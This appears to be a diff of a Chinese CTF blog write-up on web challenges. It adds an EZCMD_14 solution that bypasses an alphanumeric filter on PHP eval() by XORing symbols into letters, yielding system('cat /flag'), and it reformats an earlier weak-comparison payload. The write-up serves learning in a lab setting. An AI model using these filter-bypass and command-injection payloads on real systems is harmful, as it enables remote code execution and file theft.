@@ -347,6 +347,8 @@
         <li><a href="#ezcmd_11">EZCMD_11</a></li>
         <li><a href="#ezcmd_12">EZCMD_12</a></li>
         <li><a href="#ezcmd_13">EZCMD_13</a></li>
+        <li><a href="#ezcmd_14">EZCMD_14</a></li>
+        <li><a href="#ezcmd_15">EZCMD_15</a></li>
       </ol>
     </li>
   </ol>
@@ -476,7 +478,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 11 分钟
+                    阅读时长: 12 分钟
                 </time>
             </div>
         
@@ -493,7 +495,7 @@
 
 
 
-                <span class="article-time--wordcount">5250 字</span>
+                <span class="article-time--wordcount">5612 字</span>
             </div>
         
     </footer>
@@ -1124,10 +1126,10 @@ $b=&lsquo;2027a&rsquo;（含字母，不是纯数字）<br>
 分析条件</p>
 <p>array_search(&ldquo;QCCTF&rdquo;, $qc) 使用弱类型比较==(0 == &ldquo;QCCTF&rdquo;)为true</p>
 <p>$key === 1 返回的键名必须全等于1</p>
-<p>构造payload qc=[null,0]</p>
-<p>索引 0：null → null == &ldquo;QCCTF&rdquo; 为 false</p>
-<p>索引 1：0 → 0 == &ldquo;QCCTF&rdquo; 为 true ✓</p>
-<p>返回键名：1</p>
+<p>构造payload qc=[null,0] <br>
+索引 0：null → null == &ldquo;QCCTF&rdquo; 为 false<br>
+索引 1：0 → 0 == &ldquo;QCCTF&rdquo; 为 true ✓<br>
+返回键名：1</p>
 <p>1 === 1 → true → 输出 flag
 <img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/60.png"
 	
@@ -2378,7 +2380,90 @@ preg_replace() 使用了 /e 修饰符,在 PHP 5.x 里，/e 会把替换内容当
 	
 	
 ></p>
-<p>OK看到这里,此章就到此结束了,我们下一篇再见,各位佬</p>
+<h3 id="ezcmd_14">EZCMD_14
+</h3><p>访问首页 直接把源码高亮了出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">error_reporting(0);
+</span></span><span class="line"><span class="cl">if(isset($_GET[&#39;qc&#39;])){
+</span></span><span class="line"><span class="cl">    $qc = $_GET[&#39;qc&#39;];
+</span></span><span class="line"><span class="cl">    if(!preg_match(&#34;/[a-zA-Z0-9]/&#34;, $qc)){
+</span></span><span class="line"><span class="cl">        eval($qc);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}else{
+</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>qc 参数里只要没有字母和数字，就会被 eval() 执行。也就是说，过滤规则只拦了 [a-zA-Z0-9]，但没有拦住 PHP 里的其他语法能力。<br>
+PHP 支持字符串按位异或，因此可以只用符号拼出字母。比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;!&#34; ^ &#34;@&#34;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果就是 &ldquo;a&rdquo;，因为 33 ^ 64 = 97。同理还能继续构造别的字符，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;#&#34; ^ &#34;@&#34;;   // c
+</span></span><span class="line"><span class="cl">&#34;(&#34; ^ &#34;\\&#34;;  // t
+</span></span><span class="line"><span class="cl">&#34;&amp;&#34; ^ &#34;@&#34;;   // f
+</span></span><span class="line"><span class="cl">&#34;,&#34; ^ &#34;@&#34;;   // l
+</span></span><span class="line"><span class="cl">&#34;&#39;&#34; ^ &#34;@&#34;;   // g  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就能在完全不出现字母数字的情况下，拼出函数名和命令字符串。另外，变量名里的下划线 _ 不在过滤范围内，所以可以直接用 $_、$__ 这类变量名  最终payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_=(&#34;(&#34;^&#34;[&#34;).(&#34;\&#34;&#34;^&#34;[&#34;).(&#34;(&#34;^&#34;[&#34;).(&#34;(&#34;^&#34;\\&#34;).(&#34;%&#34;^&#34;@&#34;).(&#34;-&#34;^&#34;@&#34;);
+</span></span><span class="line"><span class="cl">$__=(&#34;#&#34;^&#34;@&#34;).(&#34;!&#34;^&#34;@&#34;).(&#34;(&#34;^&#34;\\&#34;).&#34; &#34;.&#34;/&#34;.(&#34;&amp;&#34;^&#34;@&#34;).(&#34;,&#34;^&#34;@&#34;).(&#34;!&#34;^&#34;@&#34;).(&#34;&#39;&#34;^&#34;@&#34;);
+</span></span><span class="line"><span class="cl">$_($__);  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一行拼出的是 system，第二行拼出的是 cat /flag，第三行相当于：system(&ldquo;cat /flag&rdquo;);<br>
+把它放进 qc 参数并做 URL 编码后发送即可<br>
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780451244136_cmd14_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="cmd14_1.png"
+	
+	
+></p>
+<h3 id="ezcmd_15">EZCMD_15
+</h3><p>OK看到这里,此章就到此结束了,我们下一篇再见,各位佬</p>
 
 </section>
 
